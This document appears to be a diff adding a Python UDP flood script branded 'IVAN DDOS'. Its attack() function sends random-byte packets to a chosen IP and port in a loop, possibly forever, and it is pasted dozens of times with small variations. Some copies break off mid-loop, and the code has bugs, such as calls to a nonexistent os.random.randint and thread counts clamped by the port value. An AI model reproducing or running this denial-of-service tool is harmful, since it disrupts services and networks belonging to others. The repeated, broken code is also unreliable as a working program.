+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
